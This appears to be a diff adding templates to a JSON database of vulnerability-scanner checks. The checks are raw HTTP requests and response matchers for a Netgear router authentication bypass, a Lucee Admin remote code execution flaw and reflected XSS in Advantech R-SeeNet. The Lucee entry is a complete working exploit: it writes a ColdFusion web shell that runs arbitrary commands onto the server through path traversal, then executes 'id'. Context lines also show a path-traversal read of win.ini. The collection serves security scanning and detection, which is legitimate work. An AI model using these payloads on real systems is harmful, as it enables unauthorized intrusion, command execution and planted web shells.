@@ -12741,6 +12741,40 @@
       ]
     },
     {
+      "id": "CVE-2020-27866",
+      "info": {
+        "author": "gy741",
+        "description": "This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of NETGEAR R6020, R6080, R6120, R6220, R6260, R6700v2, R6800, R6900v2, R7450, JNR3210, WNR2020, Nighthawk AC2100, and Nighthawk AC2400 routers. Authentication is not required to exploit this vulnerability.",
+        "name": "Netgear Authentication Bypass vulnerability",
+        "reference": "- https://wzt.ac.cn/2021/01/13/AC2400_vuln/\n- https://www.zerodayinitiative.com/advisories/ZDI-20-1451/\n- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27866\n",
+        "severity": "high",
+        "tags": "cve,cve2020,netgear,auth-bypass"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Debug Enable!"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /setup.cgi?todo=debug&x=currentsetting.htm HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nConnection: close\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-27982",
       "info": {
         "author": "madrobot",
@@ -15069,6 +15103,53 @@
       ]
     },
     {
+      "id": "CVE-2021-21307",
+      "info": {
+        "author": "dhiyaneshDk",
+        "description": "Lucee Server is a dynamic, Java based (JSR-223), tag and scripting language used for rapid web application development. In Lucee Admin before versions 5.3.7.47, 5.3.6.68 or 5.3.5.96 there is an unauthenticated remote code exploit. This is fixed in versions 5.3.7.47, 5.3.6.68 or 5.3.5.96. As a workaround, one can block access to the Lucee Administrator.",
+        "name": "Remote Code Exploit in Lucee Admin",
+        "reference": "- https://github.com/lucee/Lucee/security/advisories/GHSA-2xvv-723c-8p7r\n- https://github.com/httpvoid/writeups/blob/main/Apple-RCE.md\n- https://nvd.nist.gov/vuln/detail/CVE-2021-21307\n",
+        "severity": "critical",
+        "tags": "cve,cve2021,rce,lucee,adobe"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "regex": [
+                "(u|g)id=.*"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "uid=",
+                "gid=",
+                "groups="
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /lucee/admin/imgProcess.cfm?file=/whatever HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 8\n\nimgSrc=a\n",
+            "POST /lucee/admin/imgProcess.cfm?file=/../../../context/{{randstr}}.cfm HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 790\n\nimgSrc=\n<cfoutput>\n\n<table>\n<form method=\"POST\" action=\"\">\n<tr><td>Command:</td><td><input type=test name=\"cmd\" size=50\n<cfif isdefined(\"form.cmd\")>value=\"#form.cmd#\"</cfif>><br></td></tr>\n<tr><td>Options:</td><td> <input type=text name=\"opts\" size=50\n<cfif isdefined(\"form.opts\")>value=\"#form.opts#\"</cfif>><br></td></tr>\n<tr><td>Timeout:</td><td> <input type=text name=\"timeout\" size=4\n<cfif isdefined(\"form.timeout\")>value=\"#form.timeout#\"\n<cfelse> value=\"5\"</cfif>></td></tr>\n</table>\n<input type=submit value=\"Exec\" >\n</form>\n<cfif isdefined(\"form.cmd\")>\n<cfsavecontent variable=\"myVar\">\n<cfexecute name = \"#Form.cmd#\"\narguments = \"#Form.opts#\"\ntimeout = \"#Form.timeout#\">\n</cfexecute>\n</cfsavecontent>\n<pre>\n#HTMLCodeFormat(myVar)#\n</pre>\n</cfif>\n</cfoutput>\n",
+            "POST /lucee/{{randstr}}.cfm HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\n\ncmd=id&opts=&timeout=5\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-21315",
       "info": {
         "author": "pikpikcu",
@@ -15198,6 +15279,138 @@
           "path": [
             "{{BaseURL}}/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/",
             "{{BaseURL}}/Videos/1/hls/m/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-21801",
+      "info": {
+        "author": "gy741",
+        "description": "This vulnerability is present in device_graph_page.php script, which is a part of the Advantech R-SeeNet web applications. A specially crafted URL by an attacker and visited by a victim can lead to arbitrary JavaScript code execution.",
+        "name": "Advantech R-SeeNet graph parameter - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://talosintelligence.com/vulnerability_reports/TALOS-2021-1272",
+        "severity": "medium",
+        "tags": "cve,cve2021,r-seenet,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"zlo onerror=alert(1) \"",
+                "Device Status Graph"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/php/device_graph_page.php?graph=%22zlo%20onerror=alert(1)%20%22"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-21802",
+      "info": {
+        "author": "gy741",
+        "description": "This vulnerability is present in device_graph_page.php script, which is a part of the Advantech R-SeeNet web applications. A specially crafted URL by an attacker and visited by a victim can lead to arbitrary JavaScript code execution.",
+        "name": "Advantech R-SeeNet device_id parameter - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://talosintelligence.com/vulnerability_reports/TALOS-2021-1272",
+        "severity": "medium",
+        "tags": "cve,cve2021,r-seenet,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"zlo onerror=alert(1) \"",
+                "Device Status Graph"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/php/device_graph_page.php?device_id=%22zlo%20onerror=alert(1)%20%22"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-21803",
+      "info": {
+        "author": "gy741",
+        "description": "This vulnerability is present in device_graph_page.php script, which is a part of the Advantech R-SeeNet web applications. A specially crafted URL by an attacker and visited by a victim can lead to arbitrary JavaScript code execution.",
+        "name": "Advantech R-SeeNet is2sim parameter - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://talosintelligence.com/vulnerability_reports/TALOS-2021-1272",
+        "severity": "medium",
+        "tags": "cve,cve2021,r-seenet,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"zlo onerror=alert(1) \"",
+                "Device Status Graph"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/php/device_graph_page.php?is2sim=%22zlo%20onerror=alert(1)%20%22"
           ]
         }
       ]
